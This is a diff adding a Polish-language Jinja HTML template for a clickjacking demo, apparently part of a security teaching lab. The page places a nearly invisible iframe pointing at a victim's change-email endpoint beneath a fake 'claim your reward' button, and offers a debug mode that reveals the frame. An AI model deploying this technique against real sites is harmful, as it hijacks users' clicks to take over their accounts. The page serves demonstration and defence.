@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="pl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Atakujący — clickjacking</title>
+    <style>
+      :root {
+        --bg: #070a14;
+        --panel: rgba(255, 255, 255, 0.06);
+        --text: rgba(255, 255, 255, 0.92);
+        --muted: rgba(255, 255, 255, 0.72);
+        --border: rgba(255, 255, 255, 0.14);
+        --accent: #22c55e;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        margin: 0;
+        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+        background: radial-gradient(900px 500px at 30% 0%, rgba(34, 197, 94, 0.22), transparent 60%),
+          radial-gradient(800px 500px at 80% 30%, rgba(59, 130, 246, 0.18), transparent 60%), var(--bg);
+        color: var(--text);
+        padding: 22px 16px;
+      }
+      .wrap {
+        max-width: 980px;
+        margin: 0 auto;
+      }
+      .card {
+        border: 1px solid var(--border);
+        background: var(--panel);
+        border-radius: 18px;
+        padding: 16px;
+      }
+      h1 {
+        font-size: 20px;
+        margin: 0 0 8px;
+      }
+      p {
+        margin: 0 0 10px;
+        color: var(--muted);
+        line-height: 1.5;
+      }
+      a {
+        color: inherit;
+      }
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      }
+      .stage {
+        position: relative;
+        width: min(620px, 100%);
+        height: 240px;
+        margin: 16px auto 0;
+        border-radius: 18px;
+        border: 1px dashed rgba(255, 255, 255, 0.25);
+        background: rgba(255, 255, 255, 0.04);
+        overflow: hidden;
+      }
+      .bait {
+        position: absolute;
+        inset: 0;
+        display: grid;
+        place-items: center;
+        padding: 18px;
+        text-align: center;
+      }
+      .bait .btn {
+        font-size: 22px;
+        padding: 18px 22px;
+        border-radius: 14px;
+        border: 2px solid rgba(255, 255, 255, 0.8);
+        background: rgba(34, 197, 94, 0.14);
+        color: var(--text);
+        min-width: 240px;
+      }
+      .bait .sub {
+        margin-top: 10px;
+        font-size: 13px;
+        color: rgba(255, 255, 255, 0.72);
+      }
+      .victim-frame {
+        position: absolute;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        border: 0;
+        opacity: {% if debug %}0.35{% else %}0.01{% endif %};
+        {% if debug %}
+        outline: 2px solid #f59e0b;
+        {% endif %}
+      }
+      .row {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        align-items: center;
+        margin-top: 12px;
+      }
+      .pill {
+        display: inline-flex;
+        gap: 8px;
+        align-items: center;
+        padding: 8px 10px;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255, 255, 255, 0.04);
+        color: var(--muted);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="card">
+        <h1>Atak clickjacking (demo)</h1>
+        <p>
+          Ta strona udaje “ofertę”. Nad przyciskiem przynęty leży niemal niewidoczne <code>iframe</code> z ofiary:
+          <code>{{ victim_origin }}/sensitive/change-email</code>.
+        </p>
+        <p>
+          W trybie <code>VICTIM_PROTECTION=none</code> klik w przycisk przynęty trafia w przycisk ofiary (w iframe) i
+          zmienia e‑mail.
+        </p>
+
+        <div class="stage">
+          <div class="bait">
+            <div>
+              <div class="btn">Odbierz nagrodę</div>
+              <div class="sub">Kliknij, żeby “odebrać bonus” (w rzeczywistości klikasz przycisk w iframe).</div>
+            </div>
+          </div>
+
+          <iframe
+            class="victim-frame"
+            title="victim"
+            src="{{ victim_origin }}/sensitive/change-email?new_email={{ new_email | urlencode }}"
+          ></iframe>
+        </div>
+
+        <div class="row">
+          <span class="pill"><strong>Weryfikacja:</strong> odśwież <code>{{ victim_origin }}/account</code></span>
+          <span class="pill">
+            <strong>Debug:</strong>
+            {% if debug %}
+              włączony (iframe widoczny)
+            {% else %}
+              wyłączony — wejdź na <code>/?debug=1</code>
+            {% endif %}
+          </span>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
+
+
